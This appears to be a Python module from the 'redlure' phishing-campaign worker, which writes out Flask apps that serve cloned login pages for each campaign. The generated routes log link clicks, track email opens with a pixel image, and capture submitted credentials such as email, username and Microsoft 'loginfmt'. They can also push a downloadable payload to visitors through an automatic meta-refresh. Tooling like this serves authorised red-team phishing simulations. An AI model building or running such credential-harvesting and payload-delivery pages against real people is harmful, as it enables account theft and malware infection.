#!/usr/bin/env python3
from config import Config
import os
from functools import wraps
from shutil import copyfile
from flask import request, abort
from string import Template
import psutil
import requests
from app.models import WORKER_VERSION
from signal import SIGTERM

app_dir = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))


def write_to_disk(campaign):
    '''
    Create a Flask app on disk with the data provided by the server
    '''
    # will hold the contents of campaigns/<id>/app/routes.txt
    routes_content = 'from app import app\nfrom flask import request, jsonify, render_template, url_for, redirect, Markup\nimport os\nimport sys\nfrom app.functions import report_action, report_form'

    # create campaigns folder if it doesnt exist
    if not os.path.isdir(os.path.join(app_dir, 'campaigns')):
        os.mkdir(os.path.join(app_dir, 'campaigns'))

    id = str(int(campaign['id']))
    campaign_dir = os.path.join(app_dir, 'campaigns', id)

    # create campaign dir
    if not os.path.isdir(campaign_dir):
        os.mkdir(campaign_dir)

    # create basic app folder structure
    if not os.path.isdir(os.path.join(campaign_dir, 'app')):
        os.mkdir(os.path.join(campaign_dir, 'app'))
    if not os.path.isdir(os.path.join(campaign_dir, 'app', 'templates')):
        os.mkdir(os.path.join(campaign_dir, 'app', 'templates'))
    if not os.path.isdir(os.path.join(campaign_dir, 'app', 'static')):
        os.mkdir(os.path.join(campaign_dir, 'app', 'static'))
    copyfile(os.path.join(app_dir, 'templates', 'pixel.png'), os.path.join(campaign_dir, 'app', 'static', 'logo.png'))

    # copy all files from the upload dir to the static folder
    if os.path.isdir(Config.UPLOAD_FOLDER):
        for file in os.listdir(Config.UPLOAD_FOLDER):
            copyfile(os.path.join(Config.UPLOAD_FOLDER, file), os.path.join(campaign_dir, 'app', 'static', file))

    # create campaigns/<id>/app.py
    with open(os.path.join(campaign_dir, 'app.py'), 'w') as f:
        f.write('#!/usr/bin/env python3\nfrom app import app')

    # create campaigns/<id>/app/__init__.py
    with open(os.path.join(campaign_dir, 'app', '__init__.py'), 'w') as f:
        tmp = open(os.path.join(app_dir, 'templates', '__init__.txt')).read()
        f.write(tmp)

    # create campaigns/<id>/app/functions.py
    with open(os.path.join(campaign_dir, 'app', 'functions.py'), 'w') as f:
        tmp = open(os.path.join(app_dir, 'templates', 'functions.txt')).read()
        f.write(tmp)

    # create base url depending on SSL use
    if campaign['ssl']:
        base_url = f'https://{campaign["domain"]["domain"]}:{int(campaign["port"])}'
    else:
        base_url = f'http://{campaign["domain"]["domain"]}:{int(campaign["port"])}'

    # add base url to routes
    routes_content += f'\n\nbase_url = \'{base_url}\''

    # add redirect url into to routes if used
    if campaign['redirect_url'] != 'null':
        routes_content += f'\nredirect_url = \'{campaign["redirect_url"]}\''

    # check if payload is being used
    uses_payload = False
    if campaign['payload_url'] and campaign['payload_url'][:1] == '/' and 'payload_file' in campaign:
        uses_payload = True

    # add payload variables (route is written later)
    if uses_payload:
        routes_content += f'\npayload_url = \'{campaign["payload_url"]}\''
        routes_content += f'\npayload_file = \'{campaign["payload_file"]}\''

    # add url definitions for routing
    for idx, page in enumerate(campaign['pages']):
        routes_content += f'\nurl_{idx + 1} = \'{page["page"]["url"]}\''

    # add 1 extra url route for form collection/redirect
    page_count = len(campaign['pages']) + 1
    routes_content += f'\nurl_{page_count} = url_{page_count - 1} + \'/2\''

    # add route from / to first page
    routes_content += '\n\n@app.route(\'/\')'
    routes_content +=  '\ndef index():'
    routes_content +=  '\n    return redirect(url_for(\'url_1\'))'

    # create templates in campaigns/<id>/templates and routing
    for idx, page in enumerate(campaign['pages']):
        routes_content += f'\n\n\n@app.route(url_{idx + 1}, methods=[\'GET\', \'POST\'])'
        routes_content += f'\ndef url_{idx + 1}():'
        routes_content += '\n    id = request.args.get(\'id\')'

        # if first route, report clicks
        if idx == 0:
            routes_content += '\n    if id is not None:'
            routes_content += '\n        report_action(id, \'Clicked\', request.remote_addr, request.headers.get(\'User-Agent\'))'
        # else report form submissions and grab username/email/loginfmt
        else:
            routes_content += '\n    if request.form:'
            routes_content += '\n        report_form(id, request.form, request.remote_addr, request.headers.get(\'User-Agent\'))'
            routes_content += '\n    loginfmt = request.form.get(\'loginfmt\')'
            routes_content += '\n    email = request.form.get(\'email\')'
            routes_content += '\n    username = request.form.get(\'username\')'

        # render template str
        render_temp = f'\n\n    return render_template(\'{idx + 1}.html\', next_url = base_url + url_for(\'url_{idx + 2}\', id=id)'
        if idx != 0:
            render_temp += ', loginfmt=loginfmt, email=email, username=username'
        if uses_payload:
            render_temp += f', payload_url=base_url + url_for("payload", id=id), serve_payload = Markup(\'<meta http-equiv="refresh" content="0; url=\' + base_url + url_for("payload", id=id) + \'">\')'
        render_temp += ')'

        routes_content += render_temp

        # write html template file
        template_name = f'{idx + 1}.html'
        with open(os.path.join(campaign_dir, 'app', 'templates', template_name), 'w') as f:
            f.write(page['page']['html'])

    # write extra route for form collection/redirect
    routes_content += f'\n\n\n@app.route(url_{page_count}, methods=[\'POST\'])'
    routes_content += f'\ndef url_{page_count}():'
    routes_content += '\n    id = request.args.get(\'id\')'
    routes_content += '\n    if request.form:'
    routes_content += '\n        report_form(id, request.form, request.remote_addr, request.headers.get(\'User-Agent\'))'
    if campaign['redirect_url'] != 'null':
        routes_content += f'\n\n    return redirect(redirect_url)'
    else:
        routes_content += '\n\n    return redirect(url_for(\'url_1\', id=id))'

    # write route for tracking email opens
    routes_content += f'\n\n\n@app.route(\'/default/<tracker>/logo.png\')'
    routes_content += '\ndef pixel(tracker):'
    routes_content += '\n    if tracker is not None:'
    routes_content += '\n        report_action(tracker, \'Opened\', request.remote_addr, request.headers.get(\'User-Agent\'))'
    routes_content += '\n    return app.send_static_file(\'logo.png\')'

    # if payload used, app route to deliver payload
    if uses_payload:
        routes_content += '\n\n\n@app.route(payload_url)'
        routes_content += '\ndef payload():'
        routes_content += '\n    id = request.args.get(\'id\')'
        routes_content += '\n    if id is not None:'
        routes_content += '\n        report_action(id, \'Downloaded\', request.remote_addr, request.headers.get(\'User-Agent\'))'
        routes_content += '\n    return app.send_static_file(payload_file)'

    # create campaigns/<id>/app/routes.py
    with open(os.path.join(campaign_dir, 'app', 'routes.py'), 'w') as f:
        f.write(routes_content)


def require_api_key(f):
    '''
    Require an API key be provided to a function
    '''
    @wraps(f)
    def wrap(*args, **kwargs):
        if request.args.get('key') and request.args.get('key') == Config.API_KEY:
            return f(*args, **kwargs)
        else:
            abort(401)
    return wrap


def check_procs(port, kill=False):
    '''
    Check if there is a procsess running on a specific port and optionallly, kill it
    '''
    for proc in psutil.process_iter():
        for conns in proc.connections(kind='inet'):
            if conns.laddr.port == port:
                if kill:
                    proc.send_signal(SIGTERM)
                else:
                    return proc

def contact_console(interact):
    params = {'key': Config.API_KEY, 'version': WORKER_VERSION}
    try:
        r = requests.post(f'https://{Config.SERVER_IP}:{Config.SERVER_PORT}/status', params=params, verify=False, timeout=5)
    except:
        return False

    if r.content.decode() == 'unsupported':
        if interact:
            print('[-] This version of the redlure worker is unsupported by your console')
        else:
            return 2
    elif r.status_code == 200:
        if interact:
            print('[+] Successfully checked in with console')
        else:
            return 1
    else:
        if interact:
            print('[-] Failed console check-in. Console may not be running or firewall is blocking communication\n')
            input('[ Press enter to continue booting the worker ]')
        else:
            return 0
